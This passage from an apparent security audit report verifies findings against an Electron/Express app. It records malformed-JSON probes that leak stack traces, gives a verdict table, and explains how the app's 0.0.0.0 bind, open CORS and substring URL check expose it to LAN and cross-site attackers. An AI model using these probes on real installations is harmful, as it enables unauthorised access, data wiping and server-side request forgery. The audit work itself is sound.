  directions, because the app's own boot browser-cookie sweep leaves `--simulate`
  children around and new ones keep appearing. My first two passes were
  unusable for that reason; the numbers above are from the corrected counter,
  which is the version in the repository.
- Severity kept at major: Cancel is a core control and it does nothing to the
  engine; with a real video the download keeps consuming bandwidth and disk to
  completion, and there is no workaround because no cancel route exists.

---

### G-11 — A malformed or non-object JSON body returns an Express HTML stack trace with absolute filesystem paths
- **Verdict**: DOWNGRADED
- **Severity**: minor (original: major)
- **Runs**: 2 attempts, 2 reproduced
- **What I did**: Sent seven body shapes to each of the six POST endpoints, on
  the correct verb and route, with `content-type: application/json`, over raw
  HTTP. Added two controls the finding itself calls for: a wrong-verb request,
  and a well-formed body with a bad value.
- **Proof**: `audit/run-1/verify/slice-3/v-g1-g3-g11.cjs` (section G-11);
  `out/v-g1311-r1.json`, `out/v-g1311-r2.json`, key `G11`.
  ```
  36 of 42 responses came back as HTML on the correct verb, all 36 with
  absolute paths in the stack:

  POST /api/info  body "{ not json"
    400  text/html  SyntaxError … at position 2 (line 1 column 3)
         /tmp/v3-app-public/electron/dist/server.cjs:14263:23
  POST /api/info  body "null" | "\"hi\"" | "42"
    400  text/html  at JSON.parse (&lt;anonymous&gt;) …/server.cjs:14313:14
  POST /api/info  10 MB body
    413  text/html  at IncomingMessage.onData (…/server.cjs:5031:16)

  the 6 non-HTML rows are all the 93 KB VALID body -> clean JSON, 200/400
  CONTROL wrong verb  GET /api/cache/clear
    404  text/html  but NO stack trace and NO absolute paths     <- not this finding
  CONTROL bad value   {"url":"not a url"}
    400  application/json  {"error":"Invalid url"}
  ```
  So the finding's two scoping notes are both correct: wrong-verb 404s are
  Express's ordinary behaviour and are not part of this, and a 93 KB body is
  fine while 10 MB is not, which puts the limit at `express.json()`'s
  undocumented 100 KB default.
- **Why the original over-rated it**: a user cannot reach this. The renderer
  always sends well-formed JSON of a few hundred bytes, so no real session
  produces an HTML error page, nothing in the UI breaks and no work is lost — I
  looked specifically for a legitimate request that could exceed 100 KB and did
  not find one (twenty segments is a tiny body). What is left is information
  disclosure — the install path, which on Windows contains the user's account
  name — to a caller who deliberately sends a malformed body. That is real, and
  it is worse than it looks only *because* of G-2, which lets any origin and any
  LAN host ask. But an attacker who can reach the endpoint can already download
  media, read transcripts and wipe the cache; one extra path string is not an
  independent major. "Wrong but survivable" is where this sits. The missing
  `(err, req, res, next)` handler is still worth fixing, and fixing it is cheap.

---

## Verdict table

| ID | Verdict | Severity (mine) | Severity (original) |
|---|---|---|---|
| E-4 | CONFIRMED | major | major |
| E-6 | DOWNGRADED | minor | major |
| E-7 | CONFIRMED | major | major |
| F-5 | DOWNGRADED | major | blocker |
| F-6 | RAISED | **blocker** | major |
| F-7 | CONFIRMED | major | major |
| F-8 | CONFIRMED | major | major |
| G-1 | CONFIRMED | blocker | blocker |
| G-2 | CONFIRMED | major | major |
| G-3 | CONFIRMED | major | major |
| G-5 | CONFIRMED | major | major |
| G-10 | CONFIRMED | major | major |
| G-11 | DOWNGRADED | minor | major |

**Confirmed 9 · Refuted 0 · Downgraded 3 · Raised 1 · Flaky 0.**

Nothing in this slice was flaky: every finding reproduced on every attempt, with
identical results.

## Is this server safe to run on a shared network?

No. The product calls itself a loopback-only server in its own README and
inventory, and it is not one: `server/index.ts:2298` calls `app.listen(PORT)`
with no host, so it binds `0.0.0.0`, and I confirmed that from the listening
socket itself (a `/proc/net/tcp` LISTEN row with local address `00000000`, tied
by inode to the Electron main process's pid) and by actually fetching from a
socket bound to this machine's non-loopback address — with a loopback-only
server of my own as a control, which correctly refused the same probe. On top of
that `app.use(cors())` returns `Access-Control-Allow-Origin: *` and answers the
preflight for every verb, so any web page the user visits can reach it too once
it finds the port, and `/api/cache/clear` can be hit cross-site with no preflight
at all. With no credential of any kind, anyone on the same Wi-Fi who finds the
port can read the video metadata, transcripts and comments the user is working
with, learn whether they are signed in to YouTube, make the app write up to ten
minutes of video per call into the user's temp directory (I verified a real
981 KB file on disk), wipe the cache and destroy a clip the user is mid-way
through, and — because the URL check is a substring test — make the machine fetch
arbitrary URLs including ones only that machine can reach. No endpoint hands back
the cookie file's contents, so this is not direct credential theft; but
`/api/auth/youtube/status` does make the server hand the canonical cookie jar to
a child process, which is the same unprotected path that silently destroys the
saved sign-in in G-5. The port is random per launch, which is obscurity over a
16-bit space, not a control. Until the bind is pinned to `127.0.0.1` and CORS is
restricted to the app's own origin, this should be run only on a network you
would trust with an open file share.
